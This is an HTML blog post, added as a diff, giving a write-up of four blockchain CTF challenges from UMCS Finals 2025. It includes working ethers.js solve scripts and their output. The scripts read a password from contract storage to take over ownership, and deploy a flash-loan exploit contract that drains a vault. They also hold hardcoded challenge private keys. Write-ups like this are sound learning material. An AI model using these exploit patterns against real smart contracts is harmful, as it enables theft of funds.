@@ -1,0 +1,316 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>UMCS Finals 2025 | 4ry</title>
+    <link rel="stylesheet" href="../styles.css">
+  </head>
+  <body>
+    <aside class="sidebar">
+      <a class="brand" href="../index.html" aria-label="Home"><img class="avatar" src="../assets/avatar.jpg" alt=""><span class="site-title">4ry</span></a>
+      <nav class="nav" aria-label="Primary navigation"><a class="nav-link" href="../index.html"><span>⌂</span>Home</a><a class="nav-link" href="../categories/index.html"><span>☰</span>Categories</a><a class="nav-link" href="/music/"><span>♪</span>Music</a><a class="nav-link" href="../about/index.html"><span>ⓘ</span>About</a></nav>
+      <div class="socials" aria-label="Social links"><button class="theme-toggle" type="button" aria-label="Toggle light mode">◐</button><a href="https://github.com/akmlalff" aria-label="GitHub"><img class="social-icon" src="../assets/icons/github.svg" alt=""></a><a href="https://www.linkedin.com/in/akmalaliff" aria-label="LinkedIn"><img class="social-icon" src="../assets/icons/linkedin.svg" alt=""></a><a href="mailto:akmalaliff@gmail.com" aria-label="Email"><img class="social-icon" src="../assets/icons/email.svg" alt=""></a><a href="https://open.spotify.com/user/22ixrbtx4wsrufvosaf2gf3ty?si=6948217fbb694f00" aria-label="Spotify"><img class="social-icon" src="../assets/icons/spotify.svg" alt=""></a></div>
+    </aside>
+    <main class="shell">
+      <header class="topbar"><div><a class="crumb" href="../index.html">Home</a><span class="muted"> › CTF › UMCS Finals 2025</span></div><label class="search"><span>⌕</span><input id="searchInput" type="search" placeholder="Search..."></label></header>
+      <div class="layout">
+        <article class="content article">
+          <header class="article-header"><h1>UMCS Finals 2025</h1><div class="article-meta"><span>May 24, 2025</span><span>CTF</span><span>UMCS Finals 2025 / Writeup</span></div></header>
+          <div class="article-body"><h2>Writeup UMCS Finals 2025</h2>
+<p>🩸 First Blood on Bank Vaults 🩸</p>
+<blockquote>solved all the challenges but for challenge 1, 2 and 3 i forgot what&#39;s the flag due to i forgot to put it in my writeup and by the time i wrote this... the server is already down... sorry !</blockquote>
+<h3>Table of Contents</h3>
+<h4>Blockchain</h4>
+<ol>
+<li><a href="#SecureShell">SecureShell</a></li>
+<li><a href="#Mario-Kart">Mario Kart</a></li>
+<li><a href="#Bank-Vault">Bank Vaults</a></li>
+<li><a href="#A-lot-of-knowledge">A lot of knowledge</a></li>
+</ol>
+<hr>
+<h3>Blockchain</h3>
+<h4 id="SecureShell">SecureShell</h4>
+<blockquote>Author: X3 Security</blockquote>
+<h4>Description</h4>
+<blockquote>Super secure shell :)</blockquote>
+<blockquote>http://116.203.176.73:4448/</blockquote>
+<blockquote>Attachment: Participants File</blockquote>
+<h4>Solution</h4>
+<p>after understanding how the challenge works, make a script with your LLM and modify it as you went through it</p>
+<p>solve.js</p>
+<pre><code class="language-bash">const { ethers } = require(&quot;ethers&quot;);
+
+const RPC_URL        = &quot;http://116.203.176.73:4448/8cfa1eb9-a693-40c9-a4a7-87150f1b87b3&quot;;
+const PRIVKEY        = &quot;c1506e7b002dcd41ceb918eea28222d72e6130b8baa18c3160cafa0a89e454e6&quot;;
+const SETUP_ADDRESS  = &quot;0x6B8344A64d065292597D62eb6520c41223dddE3a&quot;;
+
+async function main() {
+  // 1. Connect provider &amp; wallet
+  const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
+  const wallet   = new ethers.Wallet(PRIVKEY, provider);
+
+  // 2. Read the inner SecureShell address
+  const setupAbi = [
+    &quot;function secureShell() view returns (address)&quot;,
+    &quot;function isSolved() view returns (bool)&quot;
+  ];
+  const setup = new ethers.Contract(SETUP_ADDRESS, setupAbi, wallet);
+  const shellAddr = await setup.secureShell();
+  console.log(&quot;SecureShell deployed at:&quot;, shellAddr);
+
+  // 3. Read secretPassword from storage slot 1
+  const rawSlot1 = await provider.getStorageAt(shellAddr, 1);
+  const secretPassword = ethers.BigNumber.from(rawSlot1);
+  console.log(&quot;Leaked password:&quot;, secretPassword.toString());
+
+  // 4. Call changeOwner(secretPassword, your address)
+  const shellAbi = [
+    &quot;function changeOwner(uint256 _password, address _newOwner)&quot;,
+    &quot;function owner() view returns (address)&quot;
+  ];
+  const shell = new ethers.Contract(shellAddr, shellAbi, wallet);
+
+  const tx = await shell.changeOwner(secretPassword, wallet.address);
+  console.log(&quot;Submitting changeOwner tx:&quot;, tx.hash);
+  await tx.wait();
+
+  // 5. Confirm takeover
+  const newOwner = await shell.owner();
+  console.log(&quot;New owner is:&quot;, newOwner);
+
+  // 6. Verify isSolved()
+  const solved = await setup.isSolved();
+  console.log(&quot;Challenge solved?&quot;, solved);
+}
+
+main().catch(err =&gt; {
+  console.error(err);
+  process.exit(1);
+});</code></pre>
+<p>ran it on terminal and got this</p>
+<pre><code class="language-bash">PS C:\Users\-\-\Desktop\ctf&gt; node solve.js
+SecureShell deployed at: 0xb5683B85A9e9Fb0b11f232c8A19cf1aBc28B4F10
+Leaked password: 13377331
+Submitting changeOwner tx: 0xb71277fbdbc681ae90611796782b0d13939f1df55438485ecf1cf41b674a51a1
+New owner is: 0xAA7ae1fA9ecA00463700747064bC3C0c907a786F
+Challenge solved? true</code></pre>
+<p>go back to the website and you&#39;ll get the flag</p>
+<p>Flag:</p>
+<pre><code class="language-bash">UMCS{flag}</code></pre>
+<hr>
+<h4 id="Mario-Kart">Mario Kart</h4>
+<blockquote>Author: X3 Security</blockquote>
+<h4>Description</h4>
+<blockquote>Vrooom vroom Mario !!!</blockquote>
+<blockquote>http://116.203.176.73:4447/</blockquote>
+<blockquote>Attachment: mario_player_file</blockquote>
+<h4>Solution</h4>
+<p>after understanding how the challenge works, make a script with your LLM and modify it as you went through it</p>
+<p>solve.js</p>
+<pre><code class="language-bash">// solve.js
+const ethers = require(&quot;ethers&quot;);
+
+// — hard-code your values here to eliminate the env error —
+const RPC_URL = &quot;http://116.203.176.73:4447/e6ac63a9-6e31-4a53-a176-c4bbe1cd3e56&quot;;
+const PRIVKEY = &quot;6abcea80b55f8d0764df82aa9a5e82144ab7548cb48615b36a4397810ef63e49&quot;;
+const SETUP   = &quot;0xb613AF8832F9fA98B314C6faB8Ad8DbD76c589DA&quot;;
+
+async function main() {
+  const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
+  const wallet   = new ethers.Wallet(PRIVKEY, provider);
+
+  const setup = new ethers.Contract(
+    SETUP,
+    [
+      &quot;function getMainContract() view returns (address)&quot;,
+      &quot;function isSolved()      view returns (bool)&quot;
+    ],
+    wallet
+  );
+  const mkAddr = await setup.getMainContract();
+
+  const mario = new ethers.Contract(
+    mkAddr,
+    [
+      &quot;function joinRace(string) payable&quot;,
+      &quot;function startRace()&quot;,
+      &quot;function boost()&quot;,
+      &quot;function getRacerPosition(address) view returns (uint)&quot;
+    ],
+    wallet
+  );
+
+  // join + start
+  await mario.joinRace(&quot;VSCodeHero&quot;, { value: ethers.utils.parseEther(&quot;1&quot;) });
+  await mario.startRace();
+
+  // loop boost until finish
+  let pos = 0;
+  while (pos &lt; 1000) {
+    const tx = await mario.boost();
+    await tx.wait();
+    pos = (await mario.getRacerPosition(wallet.address)).toNumber();
+    console.log(&quot;Position:&quot;, pos);
+  }
+
+  console.log(&quot;Solved?&quot;, await setup.isSolved());
+}
+
+main().catch(console.error);</code></pre>
+<p>ran it on terminal and got this</p>
+<pre><code class="language-bash">PS C:\Users\-\-\Desktop\ctf&gt; node solve.js
+...
+Position: 975
+Position: 990
+Position: 1005
+Solved? True</code></pre>
+<p>go back to the website and you&#39;ll get the flag</p>
+<p>Flag:</p>
+<pre><code class="language-bash">UMCS{flag}</code></pre>
+<hr>
+<h4 id="Bank-Vault">Bank Vaults</h4>
+<blockquote>Author: X3 Security</blockquote>
+<h4>Description</h4>
+<blockquote>Money money money !!</blockquote>
+<blockquote>http://116.203.176.73:4445/</blockquote>
+<blockquote>Attachment: Participants file</blockquote>
+<h4>Solution</h4>
+<p>after understanding how the challenge works, make a script with your LLM and modify it as you went through it</p>
+<p>solve.js</p>
+<pre><code class="language-bash">// solve.js
+const { ethers } = require(&quot;ethers&quot;);
+const solc       = require(&quot;solc&quot;);
+
+async function main() {
+  // ───── YOUR CONFIG ───────────────────────────────────────────────
+  const RPC        = &quot;http://116.203.176.73:4445/4f1a3cbd-1672-47be-b1b7-e71ca22edd4c&quot;;
+  const PK         = &quot;ae526d478db259461b021ebdb6785f108c2b641c5b3e384bba90f5ad03dce4be&quot;;
+  const SETUP_ADDR = &quot;0xA845Cc7eE457EBc5Fd115140e930191da2ED82Aa&quot;;
+  // ────────────────────────────────────────────────────────────────
+
+  const provider = new ethers.providers.JsonRpcProvider(RPC);
+  const wallet   = new ethers.Wallet(PK, provider);
+
+  // 1) fetch the real vault address AND prepare isSolved() on setup
+  const setup = new ethers.Contract(
+    SETUP_ADDR,
+    [
+      &quot;function challengeInstance() view returns (address)&quot;,
+      &quot;function isSolved() view returns (bool)&quot;
+    ],
+    wallet
+  );
+  const vaultAddr = await setup.challengeInstance();
+  console.log(&quot;🔑 BankVaults @&quot;, vaultAddr);
+
+  // 2) compile the exploit contract
+  const source = `
+  // SPDX-License-Identifier: MIT
+  pragma solidity ^0.8.25;
+
+  interface IBankVaults {
+      function stake(address receiver) external payable returns (uint256);
+      function flashLoan(uint256 amount, address receiver, uint256 timelock) external;
+      function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
+  }
+
+  contract FlashExploit {
+      IBankVaults public vault;
+      address     public setup;
+      address     public owner;
+
+      constructor(address _vault, address _setup) payable {
+          vault  = IBankVaults(_vault);
+          setup  = _setup;
+          owner  = msg.sender;
+      }
+
+      function start() external {
+          // become a staker
+          vault.stake{value: 1}(address(this));
+
+          // how much to loan?
+          uint bal = address(vault).balance;
+
+          // flash-loan to us
+          vault.flashLoan(bal, address(this), block.timestamp + 2 * 365 days);
+
+          // now balances[setup] == bal, so drain:
+          vault.withdraw(bal, owner, setup);
+      }
+
+      function executeFlashLoan(uint256 amount) external {
+          // restake on behalf of setup
+          vault.stake{value: amount}(setup);
+      }
+
+      receive() external payable {}
+  }
+  `;
+
+  const input = {
+    language: &quot;Solidity&quot;,
+    sources: { &quot;FlashExploit.sol&quot;: { content: source } },
+    settings: {
+      outputSelection: { &quot;*&quot;: { &quot;*&quot;: [&quot;abi&quot;, &quot;evm.bytecode.object&quot;] } }
+    }
+  };
+  const output   = JSON.parse(solc.compile(JSON.stringify(input)));
+  const artifact = output.contracts[&quot;FlashExploit.sol&quot;][&quot;FlashExploit&quot;];
+  const abi      = artifact.abi;
+  const bytecode = artifact.evm.bytecode.object;
+
+  // 3) deploy it (with 1 wei seed to flip isStaker)
+  const factory = new ethers.ContractFactory(abi, bytecode, wallet);
+  console.log(&quot;🛠 Deploying exploit contract...&quot;);
+  const exploit = await factory.deploy(vaultAddr, SETUP_ADDR, { value: 1 });
+  await exploit.deployed();
+  console.log(&quot;Exploit&quot;, exploit.address);
+
+  // 4) run the exploit
+  console.log(&quot;Call start()…&quot;);
+  let tx = await exploit.start({ gasLimit: 1_000_000 });
+  await tx.wait();
+
+  // 5) verify on the Setup contract!
+  console.log(&quot; isSolved?&quot;, await setup.isSolved());
+}
+
+main().catch(err =&gt; {
+  console.error(err);
+  process.exit(1);
+});</code></pre>
+<p>ran it on terminal and got this</p>
+<pre><code class="language-bash">PS C:\Users\-\-\Desktop\ctf&gt; node solve.js
+🔑 BankVaults @ 0x14AEB54fcC20e0E52Eb2e15c1495872D98004c87
+🛠 Deploying exploit contract...
+🚀 Exploit @ 0x92b82DBFCCDcb7514068c9b903567509d8caD413
+▶️  Calling start()…
+🎯 isSolved? True</code></pre>
+<p>go back to the website and you&#39;ll get the flag</p>
+<p>Flag:</p>
+<pre><code class="language-bash">UMCS{flag}</code></pre>
+<hr>
+<h4 id="A-lot-of-knowledge">A lot of knowlegde</h4>
+<blockquote>Author: X3 Security</blockquote>
+<h4>Description</h4>
+<blockquote>Whatever was learnt until now forget it, no knowledge is required.</blockquote>
+<blockquote>https://sepolia.scrollscan.com/address/0xB980702A8C8D32bFOF9381AcCFA271779132f1b2</blockquote>
+<h4>Solution</h4>
+<blockquote>Helpful Writeup For This Challenge</blockquote>
+<blockquote>https://infosecwriteups.com/tcp1p-ctf-blockchain-callenge-writeup-94b7ebe1464c</blockquote>
+<p>upon opening the website i guess it&#39;s a challlenge where we need to find the flag in the testnet Explore this address on sepoila network to find a flag. one of that transaction contain flag that was hide on the input data.</p>
+<figure><img src="../assets/writeups/umcs-finals/img/img1.png" alt="img1"><figcaption>img1</figcaption></figure>
+<p>and in the input data you&#39;ll find a decoded text so just decode it and you&#39;ll get the flag</p>
+<figure><img src="../assets/writeups/umcs-finals/img/img2.png" alt="img2"><figcaption>img2</figcaption></figure>
+<p>Flag:</p>
+<pre><code class="language-bash">umcs{ZK_i3_s3cr3tly_3asy}</code></pre></div>
+        </article>
+        <aside class="right-rail"><section><h2>Recently Updated</h2><div id="recentPosts" class="rail-list"></div></section></aside>
+      </div>
+    </main>
+    <script src="../posts-data.js?v=clean-descriptions"></script>
+    <script src="../script.js"></script>
+  </body>
+</html>
